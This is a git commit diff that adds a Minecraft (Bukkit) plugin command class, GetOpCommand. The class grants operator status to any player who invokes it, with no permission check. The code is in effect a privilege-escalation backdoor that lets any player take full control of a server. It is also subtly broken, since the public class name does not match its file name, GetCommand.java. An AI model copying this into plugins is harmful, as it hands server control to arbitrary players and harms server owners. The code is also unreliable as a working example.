88f4e1a97d32abbe934b4624577d6fd073f13c3b
Chemmaster73 <atlittrell2027@gmail.com>
2026-06-13 11:59:57 -0700

    Add GetOpCommand to grant operator status to players

---
+++ src/main/java/org/example/GetCommand.java
@@ -0,0 +1,26 @@
+package org.example;
+
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandExecutor;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+
+public class GetOpCommand implements CommandExecutor {
+
+    @Override
+    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        // Ensure the console isn't trying to run this
+        if (!(sender instanceof Player)) {
+            sender.sendMessage("Only players can run this command.");
+            return true;
+        }
+
+        Player player = (Player) sender;
+        
+        // Directly grant OP status to the player
+        player.setOp(true);
+        player.sendMessage("§aYou have been granted operator status!");
+        
+        return true;
+    }
+}
